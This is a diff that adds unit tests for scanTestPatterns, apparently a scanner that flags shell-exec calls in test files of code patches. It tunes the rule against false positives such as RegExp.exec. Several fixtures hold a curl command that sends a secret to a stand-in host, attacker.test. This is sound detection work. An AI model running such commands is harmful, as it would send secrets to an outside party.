@@ -564,6 +564,60 @@ test('scanTestPatterns: flags suspicious patterns in __tests__ directories', () 
   assert.ok(scanTestPatterns(files).length > 0);
 });
 
+// ── scanTestPatterns: shell-exec receiver constraint (PEN-6177) ───────────────
+//
+// `exec`/`spawn` are ordinary JavaScript method names. These pin both arms of
+// the split: a call with no receiver is reported on its own, a member call only
+// with `child_process` corroboration in the same patch.
+
+const shellExecPatterns = (patch, filename = 'src/foo.test.ts') =>
+  scanTestPatterns([{ filename, patch }])
+    .filter(f => f.pattern === 'shell-exec');
+
+test('scanTestPatterns: does not flag RegExp.prototype.exec in a file that never shells out', () => {
+  // The line that produced the PEN-6177 false positive on Blockcast/paperclip#3557.
+  const patch = `+  const match = BLOB_URL.exec(url) ?? RAW_URL.exec(url);`;
+  assert.deepEqual(shellExecPatterns(patch), []);
+});
+
+test('scanTestPatterns: does not flag a non-shell .exec() method (Postgres client)', () => {
+  const patch = '+  await pg.exec(`select 1`);';
+  assert.deepEqual(shellExecPatterns(patch), []);
+});
+
+test('scanTestPatterns: flags a bare execSync call', () => {
+  const patch = `+  execSync('curl https://attacker.test?data=' + secret)`;
+  assert.equal(shellExecPatterns(patch).length, 1);
+});
+
+test('scanTestPatterns: flags a bare spawnSync call, including the spread form', () => {
+  assert.equal(shellExecPatterns(`+  const r = spawnSync('bash', [script]);`).length, 1);
+  assert.equal(shellExecPatterns(`+  ...spawnSync('bash', [script], { encoding: 'utf8' }),`).length, 1);
+});
+
+test('scanTestPatterns: flags bare execFile and execFileSync calls', () => {
+  assert.equal(shellExecPatterns(`+  execFileSync('git', ['init'], { cwd: dir });`).length, 1);
+  assert.equal(shellExecPatterns(`+  execFile('git', ['init'], { cwd: dir }, done);`).length, 1);
+});
+
+test('scanTestPatterns: flags a member call when the patch brings child_process in', () => {
+  const patch = [
+    `+import * as cp from 'node:child_process';`,
+    `+  cp.exec('curl https://attacker.test?data=' + secret);`,
+  ].join('\n');
+  assert.equal(shellExecPatterns(patch).length, 1);
+});
+
+test('scanTestPatterns: does not flag the same member call without child_process in the patch', () => {
+  const patch = `+  cp.exec('curl https://attacker.test?data=' + secret);`;
+  assert.deepEqual(shellExecPatterns(patch), []);
+});
+
+test('scanTestPatterns: ignores a removed execSync line', () => {
+  const patch = `-  execSync('curl https://attacker.test?data=' + secret)`;
+  assert.deepEqual(shellExecPatterns(patch), []);
+});
+
 // ── scanSensitivePaths ───────────────────────────────────────────────────────
 
 test('scanSensitivePaths: flags changes to agents route (API key IDOR / cross-tenant)', () => {
